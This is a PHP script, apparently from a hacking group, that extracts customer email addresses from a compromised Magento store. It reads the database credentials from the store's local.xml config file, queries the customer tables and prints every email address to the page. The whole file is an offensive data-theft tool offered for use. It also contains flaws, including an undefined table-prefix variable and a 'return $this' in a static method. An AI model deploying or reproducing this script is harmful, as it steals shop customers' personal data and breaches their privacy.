<?php
/********************************************************************
@ Magento Email Extractor 
@ Author : SUCKZ
@ DARKNETHOST - DARKNETHOST.COM
@ facebook.com/package.json
@ admin@bitworms.com
@ Copyright (c) 2016 - BITWORMS LCC as Member of DARKNETHOST
********************************************************************/

DARKNETHOST::DoExtract();

class Constants
{
    
    const CONFIG_FILE = "/app/etc/local.xml";
    const MageEngine = "/app/Mage.php";
    
}

class DARKNETHOST
{
    
    protected static function GetEmail($host, $user, $pass, $dbname)
    {
        
        if (!mysql_connect($host, $user, $pass)) {
            print("Could not connect: " . mysql_error());
        }
        mysql_select_db($dbname);
        $result = mysql_query("SELECT email,value FROM " . $prefix . "customer_entity_varchar, " . $prefix . "customer_entity WHERE " . $prefix . "customer_entity_varchar.entity_id = " . $prefix . "customer_entity.entity_id and attribute_id=12");
        
        if ($result !== FALSE) {
            while ($row = mysql_fetch_array($result, MYSQL_ASSOC)) {
                echo $row["email"] . "<br/>";
            }
            mysql_free_result($result);
        }
        mysql_free_result($result);
        
    }
    
    public static function DoExtract()
    {
        
        require_once($_SERVER['DOCUMENT_ROOT'] . Constants::MageEngine);
        $xml_parse = simplexml_load_file($_SERVER['DOCUMENT_ROOT'] . Constants::CONFIG_FILE);
        $connect   = $xml_parse->global->resources->default_setup->connection;
        $Prefix    = $xml_parse->global->resources->db->table_prefix;
		
        try {
            $app = Mage::app('default');
            Mage::getSingleton('core/session', array(
                'name' => 'frontend'
            ));
        }
        catch (Exception $e) {
        }
		
        self::GetEmail($connect->host, $connect->username, $connect->password, $connect->dbname);
		return $this;
        
    }
}
